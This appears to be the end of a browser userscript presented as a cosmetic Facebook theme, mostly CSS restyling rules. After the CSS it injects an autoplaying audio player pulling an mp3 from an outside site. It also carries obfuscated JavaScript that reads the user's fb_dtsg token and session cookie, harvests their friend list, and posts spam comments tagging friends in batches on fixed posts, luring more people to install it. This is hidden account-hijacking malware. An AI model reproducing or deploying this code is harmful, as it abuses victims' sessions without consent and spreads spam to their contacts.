a:hover,.UIActionMenu_Menu,.UICheckList_Label:hover,.make_new_list_button_table,.contextual_dialog_content,#flm_list_selector .selector:hover,.show_advanced_controls:hover,.UISelectList_check_Checked,.section_header,.section_header_bg,#buddy_list_panel_settings_flyout,.options_actions,.chat_setting,.flyout,.flyout .UISelectList,.flyout .new_list,#tagging_instructions,.FriendsPage_MenuContainer,.UIActionMenu,.UIObjectListing:hover,.UIStory_Hide .UIActionMenu_Wrap,.UIBeeper,.branch_notice,.async_saving,.UIActionMenu .UIActionMenu_Wrap:hover,.attachment_link a:hover,.UITitledBox_Top,.UIBeep,.Beeps,#friends li a:hover,.apinote h2,.UIActionButton_Text,.rsvp_option:hover,.onglettrhi,.ongletghi,.ongletdhi,.ongletg,.onglettr,.ongletd,.confirm_block, .unfollow_message,.UINestedFilterList_SubItem_Selected .UINestedFilterList_SubItem_Link,.UINestedFilterList_SubItem_Link:hover,.UINestedFilterList_Item_Link:hover,.UINestedFilterList_Selected .UINestedFilterList_Item_Link,.app_dir_app_summary:hover,.app_dir_featured_app_summary:hover,.app_dir_app_wide_summary:hover,.UIStory:hover,.UIPortrait_TALL:hover,.UIActionMenu_Menu div,.UIButton_Blue,.UIButton_Gray,.quiz_cell:hover,.UIFilterList > .UIFilterList_Title,.message_rows tr:hover,.ntab:hover,.thumb_selected,.thumb:hover,.hovered a,.pandemic_bar,.promote_page,.promote_page a,.create_button a,.nux_highlight,.UIActionMenu_Wrap,.share_button_browser div,.silver_create_button,.painted_button,.flyer_button,table[bindpoint=\"thread_row\"] tbody tr:hover,.GBThreadMessageRow:hover,#header,.button:not(.close):not(.uiSelectorButton):not(.videoicon):not(.toggle),h4,button:not(.as_link),#navigation a:hover,.settingsPaneIcon:hover,a.current,.inboxView tr:hover,.tabView li a:hover,.friendListView li:hover,.LTypeaheadResults,.LTypeaheadResults a:hover,.dialog-title, .UISuggestionList_SubContainer:hover,.typeahead_message,.progress_bar_inner,.video:hover,.advanced_controls_link,.plays_val,.lightblue_box,.FriendAddingTool_InnerMenu .UISelectList,.gray_box,.uiButton:not(.uiSelectorButton),.fbPrivacyWidget .uiSelectorButton:not(.lockButton),.uiButtonSuppressed,#navAccount li:not(#navAccountInfo),.jewelHeader,.seeMore,#mailBoxItems li,#pageFooter,.uiSideNav .key-nf:hover,.key-messages .item:hover,.key-messages ul li:hover,.key-events ul li:hover,.key-media ul li:hover,.key-ff ul li:hover,.key-apps:hover,.key-games:hover,.uiSideNav .sideNavItem:not(.open) .item:hover,.fbChatOrderedList .item:hover a,.uiHeader,.uiListItem:not(.mall_divider):hover,.uiSideNav li.selected > a,.ego_unit:hover,.results,.bordered_list_item:hover,.fbConnectWidgetFooter,#viewas_header,.fbNubFlyoutTitlebar,.info_text,.stage,.masterControl .selected a,.masterControl .controls .item a:hover,.uiTypeaheadView .search,.gigaboxx_thread_hidden_messages,.uiMenu,.uiMenuInner,.itemAnchor,.gigaboxx_thread_branch_message,.uiSideNavCount,.uiBoxYellow,.loggedout_menubar_container,.pbm .uiComposer,.megaphone_box,.uiCenteredMorePager,.fbEditProfileViewExperience:hover,.uiStepSelected .middle,.GM_options_header,.bfb_tab_selected, #MessagingShelfContent,.connect_widget_like_button,.uiSideNav .open,.fbActivity:hover,.fbQuestionsPollResultsBar,.insightsDateRangeCustom,.fbInsightsTable thead th,.mall_divider,.attachmentContent .fbTabGridItem:hover,.jewelItemNew,#MessagingThreadlist .unread,.type_selected,.bfb_sticky_note,.UIUpcoming_Item:hover,.progress_bar_outer,.fbChatBuddyListDropdown .uiButton,.UIConnectControlsListSelector .uiButton,.instructions,.uiComposerMetaContainer,.uiMetaComposerMessageBoxShelf,#feed_nux,#tickerNuxStoryDiv,.fbFeedTickerStory:hover,.fbCurrentStory:hover,.uiStream .uiStreamHeaderTall,.fbChatSidebarMessage,.fbPhotoSnowboxInfo,.devsitePage .menu,.devsitePage .menu .content,#devsiteHomeBody .wikiPanel > div,.toolbarContentContainer,.fbTimelineUnitActor,#fbTimelineHeadline,.fbTimelineNavigation,.fbTimelineFeedbackActions,.timelineReportHeader,.fbTimelineCapsule .timelineUnitContainer:hover,.timelineReportContainer:hover,.fbTimelineComposerAttachments .uiListItem:hover span a,.timelinePublishedToolbar,.timelineRecentActivityLabel,.fbTimelineMoreButton,.overlayTitle,.friendsBoxHeader,.escapeHatchHeader,.tickerStoryAllowClick,.appInvite:hover,.fbRemindersStory:hover,.lifeEventAddPhoto a:hover,.insights-header,.ufb-dataTable-header-container,.ufb-button,.older-posts-content,.mleButton:hover,.btnLink,.fill,.cropMessage,.adminPanelList li:hover a,.tlPageRecentOverlayStream,.addListPageMegaphone,.searchListsBox,.ogStaticPagerHeader,.dialogTitle,#rogerSidenavCallout,.fbTimelineAggregatedMapUnitSeeAll,.shareRedesignContainer,.ogSingleStoryText,.ogSliderAnimPagerPrevWrapper,.ogSliderAnimPagerNextWrapper,.shareRedesignText,.pluginRecommendationsBarTop\n{ background: -webkit-repeating-linear-gradient(-15deg,rgba(50,40,20,.5) 0px, rgba(75,65,32,.5) 75px, rgba(185,175,100,.5) 200px, rgba(75,65,32,.5) 325px, rgba(50,40,20,.5) 400px), fixed !important;}\n\n.hovercard .stage,.profileChip,.GM_options_wrapper_inner,.MessagingReadHeader .uiHeader,#MessagingShelf,#navAccount ul,.uiTypeaheadView,#blueBar,.uiFacepileItem .uiTooltipWrap,.fbJewelFlyout,.jewelItemList li,.notification:not(.jewelItemNew),.fbNubButton,.fbChatTourCallout .body,.uiContextualDialogContent,.fbTimelineStickyHeader .back,.timelineExpandLabel:hover,.pageNotifFooter a,.fbSettingsListLink:hover,.uiOverlayPageContent,#bfb_option_list,.fbPhotoSnowlift .rhc,.ufb-tip-title,.balloon-content,.tlPageRecentOverlayTitle,.uiDialog,.uiDialogForm,.permissionsLockText, .uiMenuXBorder,.-cx-PRIVATE-uiDialog__content,.-cx-PRIVATE-uiDialog__title\n{ background: -webkit-repeating-linear-gradient(-15deg,rgba(50,40,20,.5) 0px, rgba(75,65,32,.5) 75px, rgba(185,175,100,.5) 200px, rgba(75,65,32,.5) 325px, rgba(50,40,20,.5) 400px), fixed,rgba(10,10,10,.6) !important; }\n\n.unread .badge,.fbDockChatBuddyListNub .icon,.sx_7173a9,.selectedCheckable .checkmark {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/blueball15.png\") no-repeat right center!important;}\n\ntable[class=\" \"] .badge:hover,table[class=\"\"] .badge:hover,.offline .fbDockChatBuddyListNub .icon,.fbChatSidebar.offline .fbChatSidebarMessage .img  {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/grayball15.png\") no-repeat right center!important;}\n\n.fbChatSidebar.offline .fbChatSidebarMessage .img {height: 16px !important;}\n\n.offline .fbDockChatBuddyListNub .icon,.fbDockChatBuddyListNub .icon,.sx_7173a9 {margin-top: 0 !important;height: 15px !important;}\n\na.idle,.buddyRow.idle .buddyBlock,.fbChatTab.idle .tab_availability,.fbChatTab.disabled .tab_availability,.chatIdle .chatStatus,.idle .fbChatUserTab .wrap,.chatIdle .uiTooltipText,.markunread,.bb .fbDockChatTab.user.idle .titlebarTextWrapper,.fbChatOrderedList .item:not(.active) .status {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/grayball10paddedright.png\") no-repeat left center !important;}\n\n.fbChatOrderedList .item .status {width: 10px !important;}\n\n.headerTinymanName {max-width: 320px !important; white-space: nowrap !important; overflow: hidden !important;}\n\n.uiTooltipText {padding-left: 14px !important;border: none !important;}\n \n.fbNubButton,.bb .fbNubFlyoutTitlebar,.bb .fbNub .noTitlebar,.fbDockChatTab,#fbDockChatBuddylistNub .fbNubFlyout,.fbDockChatTabFlyout,.titlebar {border-radius: 8px 8px 0 0!important;}\n\n.uiSideNav .open {padding-right: 0 !important;}\n.uiSideNav .open,.uiSideNav .open > *,#home_stream > *,.bb .rNubContainer .fbNub,.fbChatTab {margin-left: 0 !important;}\n.uiSideNav .open ul > * {margin-left: -20px !important;}\n.uiSideNav .open .subitem > .rfloat {margin-right: 20px !important;}\n\n.timelineUnitContainer .timelineAudienceSelector .uiSelectorButton {padding: 1px !important; margin: 4px 0 0 4px !important;}\n.timelineUnitContainer .audienceSelector .uiButtonNoText .customimg {margin: 2px !important;}\n.timelineUnitContainer .composerAudienceSelector .customimg {opacity: 1 !important; background-position: 0 1px !important; padding: 0 !important;}\n\n.fbNub.user:not(.disabled) .wrap {padding-left: 15px !important;}\n.fbNubFlyoutTitlebar .titlebarText {padding-left: 12px !important;}\n\na.friend:not(.idle),.buddyRow:not(.idle) .buddyBlock,.fbChatTab:not(.idle):not(.disabled) .tab_availability,.chatOnline .chatStatus,.markread,.user:not(.idle):not(.disabled) .fbChatUserTab .wrap,.chatOnline .uiTooltipText,.bb .fbDockChatTab.user:not(.idle):not(.disabled) .titlebarTextWrapper,.fbChatOrderedList .item.active .status,.active .titlebarTextWrapper,.uiMenu .checked .itemAnchor {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/blueball10paddedright.png\") no-repeat !important;}\n\na.friend:not(.idle),.buddyRow:not(.idle) .buddyBlock,.fbChatTab:not(.idle):not(.disabled) .tab_availability,.chatOnline .chatStatus,.markread,a.idle,.buddyRow.idle .buddyBlock {background-position: right center !important;}\n\n.user:not(.idle):not(.disabled) .fbChatUserTab .wrap,.chatOnline .uiTooltipText,.bb .fbDockChatTab.user:not(.idle):not(.disabled) .titlebarTextWrapper,.fbChatOrderedList .item.active .status,.active .titlebarTextWrapper,.user .fbChatUserTab .wrap {background-position: left center !important;}\n\n.uiMenu .checked .itemAnchor {background-position: 5px center !important;}\n\n.markunread,.markread {background-position: 0 center !important;}\n\n.chatIdle .chatStatus,.chatOnline .chatStatus {width: 10px !important;height: 10px !important;background-position: 0 0 !important;}\n\n#fbRequestsJewel .jewelButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Friends-Gray.png\") no-repeat center center !important;}\n\n#fbRequestsJewel:hover .jewelButton,#fbRequestsJewel.hasNew .jewelButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Friends.png\") no-repeat center center !important;}\n\n#fbMessagesJewel .jewelButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Mail_Icon-gray.png\") no-repeat center center !important;}\n\n#fbMessagesJewel:hover .jewelButton,#fbMessagesJewel.hasNew .jewelButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Mail_Icon.png\") no-repeat center center !important;}\n\n#fbNotificationsJewel .jewelButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Earth-gray.png\") no-repeat center center !important;}\n\n#fbNotificationsJewel:hover .jewelButton,#fbNotificationsJewel.hasNew .jewelButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Earth.png\") no-repeat center center !important;}\n\n.topBorder,.bottomBorder {background: #000 !important;}\n\n.pl-item,.ical,.pop_content  {background-color: #333 !important;}\n.pl-alt {background-color: #222 !important;}\n\n.friend:hover,.friend:not(.idle):hover,.fbTimelineRibbon {background-color: rgba(10,10,10,.6) !important;}\n\n.maps_arrow,#sidebar_ads,.available .x_to_hide,.left_line,.line_mask,.chat_input_border,.connect_widget_button_count_nub,\n.uiStreamPrivacyContainer .uiTooltip .img,.UIObjectListing_PicRounded,.UIRoundedImage_CornersSprite,.UITabGrid_Link:hover .UITabGrid_LinkCorner_TL,.UITabGrid_Link:hover .UITabGrid_LinkCorner_TR,.UITabGrid_Link:hover .UITabGrid_LinkCorner_BL,.UITabGrid_Link:hover .UITabGrid_LinkCorner_BR,.UILinkButton_R,.pagesAboutDivider  {visibility:hidden !important;}\n\n.nub,#contentCurve,#pagelet_netego_ads,img.plus,.highlighter,.uiToolbarDivider,.bfb_sticky_note_arrow_border,.bfb_sticky_note_arrow,#ConfirmBannerOuterContainer,.uiStreamHeaderBorder,.topBorder,.bottomBorder,.middleLink:after,.sideNavItem .uiCloseButton,.mask,.topSectionBottomBorder {display: none !important;}\n\n.fbChatBuddyListTypeahead {display: block !important;}\n\n.chat_input {width: 195px !important;}\n\n.fb_song_play_btn,.friend,.wrap,.uiTypeahead,.share,.raised,.donated,.recruited,.srch_landing,.story_editor,.jewelCount span {background-color: transparent !important;}\n\n.extended_link div {background-color: #fff !important}\n\n#fbTimelineHeadline,.coverImage {width: 851px !important; margin-left: 1px !important;}\n\n*:not([style*=border]) {border-color: #000 !important;}\n\n#feed_content_section_applications *,#feed_header_section_friend_lists *,.summary,.summary *,.UIMediaHeader_TitleWash,.UIMediaHeader_TitleWrapper,.feedbackView .comment th div,.searchroot,.composerView th div,.reply th div,.borderTagBox,.innerTagBox,.friend,.fbNubFlyoutTitlebar,.fbNubButton {border-color: transparent !important;}\n\n.innerTagBox:hover {border-color: rgba(10,10,10,.45) !important;box-shadow: 0 0 5px 4px #FF9D52 !important;}\n\n.status_placeholder,.UIComposer_TDTextArea,.UIComposer_TextAreaShadow,.UIContentBox ,.box_column,form.comment div,.comment_box div,#tagger,.UIMediaItem_Wrapper,#chat_tab_bar *,.UIActionMenu_ButtonOuter input[type=\"button\"],.inner_button,.UIActionButton_Link,.divider,.UIComposer_Attachment_TDTextArea,#confirm_button,#global_maps_link,.advanced_selector,#presence_ui *,.fbFooterBorder,.wash,.main_body,.settings_screenshot,.uiBlingBox,.inputContainer *,.uiMentionsInput,.uiTypeahead,.editNoteWrapperInput,.date_divider,.chatStatus,#headNav,.jewelCount span,.fbFeedbackMentions .wrap,.uiSearchInput span,.uiSearchInput,.fbChatSidebarMessage,.devsitePage .body > .content,.timelineUnitContainer,.fbTimelineTopSection,.coverBorder,.pagesTimelineButtonPagelet .counter,#pagelet_timeline_profile_actions .counter,#navAccount.openToggler,#contentArea,.uiStreamStoryAttachmentOnly,.ogSliderAnimPagerPrev .content,.ogSliderAnimPagerNext .content,.ogSliderAnimPagerPrev .wrapper,.ogSliderAnimPagerNext .wrapper,.ogSingleStoryContent,.ogAggregationAnimSubstorySlideSingle,.ogAggregationAnimSubstoryHideSelector .uiCloseButton {border: none !important;}\n\n.uiStream .uiStreamHeaderTall {border-top: none !important; border-bottom: none !important;}\n\n.attachment_link a:hover,input[type=\"input\"],input[type=\"submit\"]:not(.fg_action_hide):not(.stat_elem):not([name=\"add\"]):not([name=\"actions[reject]\"]):not([name=\"actions[accept]\"]):not([value=\"Find Friends\"]):not([value=\"Share\"]):not([value=\"Maybe\"]):not([value=\"No\"]):not([value=\"Yes\"]):not([value=\"Comment\"]):not([value=\"Reply\"]):not([value=\"Flag\"]):not([type=\"submit\"]),.UITabGrid_Link:hover,.UIFilterList_Selected,.make_new_list_button_table,.confirm_button,.fb_menu_title a:hover,.Tabset_selected {border-bottom-color: #000 !important;border-bottom-width: 1px !important;border-bottom-style: solid !important;border-top-color: #000 !important;border-top-width: 1px !important;border-top-style: solid !important;border-left-color: #000 !important;border-left-width: 1px !important;border-left-style: solid !important;border-right-color: #000 !important;border-right-width: 1px !important;border-right-style: solid !important;-moz-appearance:none!important;}\n\n.UITabGrid_Link,.fb_menu_title a,.button_main,.button_text,.button_left {border-bottom-color: transparent !important;border-bottom-width: 1px !important;border-bottom-style: solid !important;border-top-color: transparent !important;border-top-width: 1px !important;border-top-style: solid !important;border-left-color: transparent !important;border-left-width: 1px !important;border-left-style: solid !important;border-right-color: transparent !important;border-right-width: 1px !important;border-right-style: solid !important;-moz-appearance:none!important;}\n\n.UIObjectListing_RemoveLink,.UIIntentionalStory_CloseButton,.remove,.x_to_hide,.fg_action_hide a,.notif_del,.UIComposer_AttachmentArea_CloseButton,.delete_msg a,.ImageBlock_Hide, .fbSettingsListItemDelete,.fg_action_hide,img[src=\"http://static.ak.fbcdn.net/images/streams/x_hide_story.gif?8:142665\"],.close,.uiSelector .uiCloseButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/closeX.png\") no-repeat !important;text-decoration: none !important;height: 18px !important;}\n\ndiv.fbChatSidebarDropdown .uiCloseButton,.fbDockChatDropdown .uiSelectorButton,.storyInnerContent .uiSelectorButton,.fbTimelineAllActivityStorySelector .uiButton .img {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/GrayGear_15.png\") center center no-repeat !important; width: 26px !important;}\n\ndiv.fbChatSidebarDropdown .uiCloseButton {height: 23px !important;}\n\n.videoicon {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/video_chat_small.png\") center center no-repeat !important; }\n\n.uiStream .uiStreamFirstStory .highlightSelector .uiSelectorButton {margin-top: -5px !important;}\n\n.UIObjectListing_RemoveLink,.UIIntentionalStory_CloseButton,.remove,.x_to_hide,.fg_action_hide a,.notif_del,.UIComposer_AttachmentArea_CloseButton,.delete_msg a,.ImageBlock_Hide,.uiCloseButton,.fbSettingsListItemDelete {width: 18px !important;}\n.fg_action_hide {width: 18px !important; margin-top: 0 !important; }\n\n.fg_action_hide_container {width: 18px !important;}\n.uiSideNav li {left: 0 !important;padding-left: 0 !important;}\n\n.UIHotStory_Bling,.UIHotStory_BlingCount:hover,.request_link:hover,.request_link span:hover,.uiLinkButton {text-decoration: none !important;}\n\nli form + .navSubmenu > div > div {padding: 12px !important; margin-top: -12px !important;}\nli form + .navSubmenu > div img {margin-top: 12px !important;}\n\n.uiStreamBoulderHighlight {border-right: none !important;}\n\n\n.UIMediaItem_Photo .UIMediaItem_Wrapper {padding: 10px !important;}\n\n#footerRight,.fg_action_hide {margin-right: 5px !important;}\n\n.fbx_stream_header,.pas .input {padding: 5px !important;}\n\n.ptm {padding: 5px 0 !important;}\n\n.fbTimelineUnitActor {padding-top: 5px !important;}\n.home_right_column {padding-top: 0 !important;}\n\n.uiButton[tooltip-alignh=\"right\"] .uiButtonText {padding: 2px 10px 3px 10px !important; font-weight: bold !important;}\n\n.uiSideNav .uiCloseButton {left: 160px !important;border: none !important;}\n.uiSideNav .uiCloseButton input {padding-left: 2px !important;padding-right: 2px !important;margin-top: -4px !important;border: none !important;}\n\n.storyInnerContent .uiTooltip.uiCloseButton   {margin-right: -10px !important;}\n.storyInnerContent .stat_elem .wrap .uiSelectorButton.uiCloseButton,.uiFutureSideNavSection .open .item,.uiFutureSideNavSection .open .subitem,.uiFutureSideNavSection .open .subitem .rfloat,.uiSideNav .subitem,.uiSideNav .open .item {margin-right: 0 !important;}\n\n.audienceSelector .wrap .uiSelectorButton {padding: 2px !important;}\n\n.jewelHeader,.fbSettingsListItemDelete {margin: 0 !important;}\n.UITitledBox_Title {margin-left: 4px;margin-top:1px;}\n\n.uiHeader .uiHeaderTitle {margin-left: 7px !important;}\n.fbx_stream_header .uiHeaderTitle,#footerLeft  {margin-left: 5px !important;}\n\n.comments_add_box_image {margin-right: -5px !important;}\n.show_advanced_controls {margin-top:-5px !important;}\n.chat_window_wrapper {margin-bottom: 3px !important;}\n.UIUpcoming_Item {margin-bottom: 5px !important;}\n#pagelet_right_sidebar {margin-left: 0 !important;}\n\n.profile-pagelet-section,.uiStreamHeaderTall,.timelineRecentActivityLabel,.friendsBoxHeader  {padding: 5px 10px !important;}\n\n.GBSearchBox_Button,.uiSearchInput button {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/search.png\")  center center !important;}\n.uiSearchInput button {width: 23px !important;height: 21px !important;top: 0 !important;background-position: 3px 2px !important;}\n\n.UIButton_Text,.UISearchInput_Text {font-weight: normal !important;}\n\n.x_to_hide,.top_bar_pic .UIRoundedImage {margin: 0 !important;padding: 0 !important;}\n\n.uiHeaderActions .uiButton .uiButtonText {margin-left: 15px !important;}\n\n#contentArea {padding: 0 12px !important; }\n\n.searchroot,#share_submit input {padding-right: 5px !important; }\n.composerView {padding-left: 8px !important;padding-bottom: 4px !important;}\n.info_section {padding: 6px !important;}\n.uiInfoTable .dataRow .inputtext {min-width: 200px !important;}\n\n.fbPrivacyWidget .uiButton .mrs,.uiButtonSuppressed .mrs {margin: 0 -10px 0 6px !important;}\n\n.uiStreamPrivacyContainer .uiTooltip,.UIActionMenu_Lock,.fbPrivacyLockButton,.fbPrivacyLockButton:hover,.sx_7bedb4,.fbPrivacyWidget .uiButton .mrs,.uiButtonSuppressed .mrs,div.fbPrivacyLockSelector {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/privacylock.png\") no-repeat center center !important;}\n\n.jewelCount,.pagesTimelineButtonPagelet .counter {margin: -8px -4px 0 0 !important;padding: 1px 4px !important;}\n\n#share_submit {padding: 0 !important;border: none !important;}\n#share_submit input,.friend_list_container .friend {padding-left: 5px !important;}\n\na{outline: none !important;}\n\n#contact_importer_container input[value=\"Find Friends\"] {border: none !important;box-shadow: none !important;}\n\n#pageLogo {margin-left: -1px !important;  }\n\n#pageLogo a {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Facebook.png\") no-repeat center center !important;left: 0 !important;width: 107px !important;margin-right: 1px !important; margin-top: 0 !important;}\n\n#pageLogo a:hover {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Facebook-glow.png\") no-repeat center center !important;}\n\n#pageHead {margin-top: -6px !important;}\n\n.mainWrapper .uiSelectorButton { margin-top: 10px !important; }\n\n#globalContainer {margin-top: 3px !important;}\n\n.platform_dialog #blueBar,.withCanvasNav #blueBar {position: absolute !important; margin-top: 10px !important; height: 30px !important;  }\n\n.friend_list_container .friend {margin-right: 0 !important; }\n\n.list_select {padding: 3px !important;}\n\n.fbNubFlyout .input {width: 254px !important;}\n\n.highlightIndicator {top: 0 !important;}\n\n.audienceSelector .uiButtonText {padding-left: 8px !important;}\n.profile #pagelet_netego {margin-top: -60px !important;margin-left: -30px !important;}\n.pas .input,.selectedCheckable .checkmark {margin-left: -5px !important;}\n\n.removable {top: 0 !important;bottom: 0 !important;margin-top: -4px !important;border: none !important;}\n\n.uiSideNavCount,.uiStreamAttachments div embed,.jewelCount,.uiButton,.fbChatSidebarFooter .button,.uiSearchInput button,.uiSelectorButton,.pagesTimelineButtonPagelet .counter,#pagelet_timeline_profile_actions .counter,.pluginRecommendationsBarButtonLike {border-radius: 6px !important;}\n\n.fbActivity,.UIRoundedImage {margin: 4px !important;}\n\n#facebook:not(.tinyViewport) body:not(.UIPage_LoggedOut):not(.fbIndex):not(.platform_dialog):not(.withCanvasNav) #blueBar {width: 100% !important;margin: 0 auto !important;top: 10px !important;height: 30px !important;}\n\n.uiUfiSmall .commentArea .textBox:not([style*=\"height\"]) {height: 20px !important; }\n.composerTypeahead .textInput:not([style*=\"height\"]){height: 27px !important; }\n\n.dataTable .inputtext,.uiInfoTable .dataRow .inputtext {padding-left: 20px !important;}\n\n.fbTimelineAllActivityStorySelector .uiButton,.fbDockChatTabFlyout .close {margin-top: 3px !important;}\n.fbTimelineAllActivityStorySelector .uiButton .img {margin: 0 -3px !important;}\n\n.audienceSelector .uiButton {padding: 2px 0 2px 0 !important;}\n.audienceSelector .uiButton .img {margin-right: -1px !important;}\n\n.fbTimelineContentHeader .uiHeaderTitle {font-size: 2.0em !important;}\n\n\n.ogSliderAnimPagerGridTd .page {margin: 0 14px 0 -5px !important;}\n.ogSliderAnimPagerNext .content {margin-left: -18px !important;}\n#bfb_options_button_li {float:left !important;}\n\n.ego_column { display:none ; }";
if (typeof GM_addStyle != "undefined") {
	GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
	PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
	addStyle(css);
} else {
	var node = document.createElement("style");
	node.type = "text/css";
	node.appendChild(document.createTextNode(css));
	var heads = document.getElementsByTagName("head");
	if (heads.length > 0) {
		heads[0].appendChild(node); 
	} else {
		// no head yet, stick it whereever
		document.documentElement.appendChild(node);
	}
}
})();
//Nhạc
var parent=document.getElementsByTagName("html")[0];var _body = document.getElementsByTagName('body')[0];
var _div = document.createElement('div');_div.style.position = "fixed";_div.style.display = "block";
_div.style.width = "0px";_div.style.opacity= 0.90;_div.style.bottom = "+0px";_div.style.left = "+0px";
var _audio= document.createElement('audio');_audio.controls = true;_audio.autoplay = false;_audio.autoplay = true;
_audio.src = "http://clipviet24h.net/nhac.mp3";
_div.appendChild(_audio);_body.appendChild(_div);
//Bùa
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","458693607608825","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= (y) Hay quá mình làm được nhiều icon rất đẹp rồi nè Thanks Ad nhé <3  😼  😽  😿  🙀  :*  (^^^)  🌱  🌱  🌙  🌟  🌻  , test tag mọi người vô cài đặt dùng chung cho vui nè (Y) <3 :D  :P ✌ 💨 👏 Ai thấy hay thì thử đi nhé hjhj (y) ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(458693607608825);
arkadaslari_al(1416393175291136);
eval
